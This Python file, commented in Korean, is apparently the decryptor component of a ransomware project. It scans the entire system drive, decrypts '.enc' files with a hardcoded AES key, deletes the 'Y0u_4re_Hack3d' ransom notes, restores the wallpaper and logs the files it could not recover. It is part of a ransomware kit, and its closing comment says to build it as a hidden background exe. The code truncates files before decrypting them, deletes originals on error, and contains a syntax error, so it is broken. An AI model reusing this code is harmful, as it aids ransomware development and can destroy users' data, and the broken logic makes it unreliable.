import os, shutil, ctypes, numpy
from Cryptodome.Cipher import AES

# 복호화에 사용할 KEY값 (암호화의 KEY값이랑 일치해야함)
KEY = b'12345678901234567890123456789012' # 32 bytes
# 복호화할 폴더의 경로
path = os.environ['systemdrive'] + '/'
# 복호화가 끝나고 변경될 바탕화면의 이미지
backgroundImg = 'C:/Windows/Web/Wallpaper/Windows/img0.jpg'
# 암호화 과정에서 남긴 txt 파일의 제목
notepadName = 'Y0u_4re_Hack3d.txt'
# 복호화 하지 못한 파일의 경로가 담길 변수
I_am_so_sorry = ''

# 배경화면을 변경해주는 함수 #
def changeBG():
    ctypes.windll.user32.SystemParametersInfoW(20, 0, backgroundImg, 0)

# 복호화를 진행하는 함수 #
def decryptAES(ciphertext, tag):
    cipher = AES.new(KEY, AES.MODE_SIV)
    plaintext = (cipher.decrypt_and_verify(ciphertext, tag)) # MAC태그(tag)가 유효한지 검사한 후 복호화
    return plaintext

# 파일을 검색하고, 전체적인 프로그램 흐름을 실행하는 함수 #
def search(dirname):

    # path에 지정된 경로내의 모든 파일을 탐색하는 for문
    for (path, dir, files) in os.walk(dirname):
            for filename in files:

                # 모든 파일에 추가된 메모장 삭제하기 #
                notepadErase = False # 메모장은 암호화가 되어있지 않은 파일이기 때문에 복호화 진행시 에러 유발, 그걸 방지하기 위한 변수
                if notepadName in filename:
                    try:
                        os.remove(path + '/' + filename)
                        notepadErase = True
                    except:
                        NOP=True

                # Windows 폴더 필터링 (복호화 프로그램은 암호화가 안된 Windows 폴더를 복호화해줄 필요가 없음) #
                if not os.environ['systemdrive'] + '/' + 'Windows' in path:

                    if '.enc' in filename: # 이미 복호화가 끝난 파일들을 또 복호화 했을때 이를 막기위한 코드

                        iDontKnow = False  # 전체 과정에서 알 수 없는 에러를 처리해주기 위한 변수

                        # 파일 경로 지정 #
                        link = path + '/' + filename
                        print(link)

                        # 정상적인 복호화 진행
                        if not notepadErase: # 모든 곳에 남겨둔 메모장이 아니라면
                            # 파일 열기
                            # 파일 읽기모드로 열때 발생하는 에러 처리 #
                            try:
                                raw = open(link, 'rb')
                                data = raw.read()
                                fileReadError = False
                            except:
                                fileReadError = True
                            # 파일 쓸기모드로 열때 발생하는 에러 처리 #
                            try:
                                dec = open(link, 'wb')
                                fileWriteError = False
                            except:
                                fileWriteError = True
			    # 파일을 여는 과정에서 에러가 발생하지 않았다면 복호화 진행
                            if not (fileReadError or fileWriteError):
                                # 복호화 진행 #
                                ciphertext = data
                                # 태그 관련 변수
                                tag = []
                                j = b''  # tag 의 범위를 구하기 위한 임시변수
                                k = 0  # tag의 범위를 구하기 위한 임시변수
                                rawCiphertext = []
                                k2 = 1  # 'tag:' 문자열을 필터링하기 위한 임시변수 (암호문을 구하기 위함)
				# k : tag값을 구하기 위한 변수, k2 : 암호문을 구하기 위한 변수

                                # tag값을 구하는 for문 #
                                try:
                                    for i in range(len(ciphertext)):
                                        if ciphertext[i] == 116:  # t
                                            if ciphertext[i + 1] == 97:  # a
                                                if ciphertext[i + 2] == 103:  # g
                                                    if ciphertext[i + 3] == 58:  # :
                                                        j = i + 4  # +4로 해야 'tag:' 다음임
                                        if i == j:
                                            k = 1 # 'tag:' 다음(tag값)이라는 타이밍을 알려주는 변수
                                        if k:
                                            tag.append(ciphertext[i])  # 'tag:' 다음에는 tag 리스트에 값을 넣어주고
                                        else:
                                            if ciphertext[i] == 116:  # t
                                                if ciphertext[i + 1] == 97:  # a
                                                    if ciphertext[i + 2] == 103:  # g
                                                        if ciphertext[i + 3] == 58:  # :
                                                            k2 = 0  # ('tag:' 문자 필터링)
                                            if k2:
                                                rawCiphertext.append(ciphertext[i])  # 'tag:' 전에는 rawCiphertext 리스트에다가 값을 넣어줌
                                    for i in range(len(tag)):  # 리스트 안에 있는 숫자 값을 바이트로 전환 (tag값)
                                        tag[i] = bytes([tag[i]]
                                    for i in range(len(rawCiphertext)):  # 리스트 안에 있는 숫자 값을 바이트로 전환 (암호문)
                                        rawCiphertext[i] = bytes([rawCiphertext[i]])

                                    tag = numpy.array(tag)  # 리스트를 바이트로 변환 (tag값)
                                    tag = tag.tobytes()
                                    rawCiphertext = numpy.array(rawCiphertext)  # 리스트를 바이트로 변환 (암호문)
                                    rawCiphertext = rawCiphertext.tobytes()

                                    # 복호화 함수 #
                                    plaintext = decryptAES(rawCiphertext, tag)

                                except:
                                    iDontKnow = True

                                # 파일 확장자 복구 #
                                filelink = link[:-4] # .enc 문자를 제거
                                print(filelink)
                                try:
                                    file = open(filelink, 'wb')
                                except:
                                    file = open(link, 'rb') # iDontKnow에 있을 file.close를 맞춰주기 위함, 실제로 사용하기 위해 여는게 아님
                                    iDontKnow=True

                                # tag구하는 for문 또는 파일 확장자 복구에서 알수 없는 에러가 발생했다면 #
                                if (iDontKnow):
                                    try:
                                        plaintext = "I'm sorry to hear that...;)".encode()
                                        file.close()
                                        filename = filename[:-4] # .enc 확장자 지워줌
                                        filename += '.I_am_so_sorry' # 파일 이름 맨 끝에 '.I_am_so_sorry'를 붙여서 파일을 새로 하나 생성
                                        filelink = path + '/' + filename
                                        file = open(filelink, 'wb')
                                        raw.close()
                                        dec.close()
                                        print('.enc 지우기전 link : ' + link)
                                        os.remove(link) # .enc파일을 지워줌
                                        link = link[:-4] # 원본 파일 이름을 가지고 있는 암호화 파일도 지워줌
                                        print('.enc 지운 link : ' + link)
                                    except:
                                        NOP=True

                                    # 복호화 하지 못한 파일 경로 바탕화면에 남기기 #
                                    global I_am_so_sorry
                                    I_am_so_sorry += filelink + '\n'

                                # 복호화된 내용 덮어쓰기 #
                                try:
                                    file.write(plaintext)
                                except:
                                    NOP=True

                                # 파일 닫기 #
                                file.close()
                                try:
                                    raw.close()
                                    dec.close()
                                except:
                                    NOP=True
                                
                                # 암호화된 파일 삭제 #
                                try:
                                    os.remove(link)
                                except:
                                    NOP=True

# 바탕화면에 만들어 놓은 Y0u_4re_Hack3d 폴더 삭제하기 #
try: # 배경화면에 만들어 놓은 파일을 이미 삭제한 경우
    shutil.rmtree(os.path.expanduser('~') + '\\' + 'Desktop' + '\\' + 'Y0u_4re_Hack3d')
except:
    NOP=True

# 파일 경로 지정 #
search(path)
# 바탕화면 복원 #
changeBG()
# 복호화하지 못한 파일 바탕화면에 경로 저장 #
file = open(os.path.expanduser('~') + '\\' + 'Desktop' + '\\' + 'I_am_so_sorry.txt', 'w', encoding='utf-8')
file.write(I_am_so_sorry)
file.close()

print("Decryption Successfully Finished")

# 마지막으로 백그라운드 실행을 위해 exe 파일로 변환시켜주면 된다
# pyinstaller -F -w [file].py
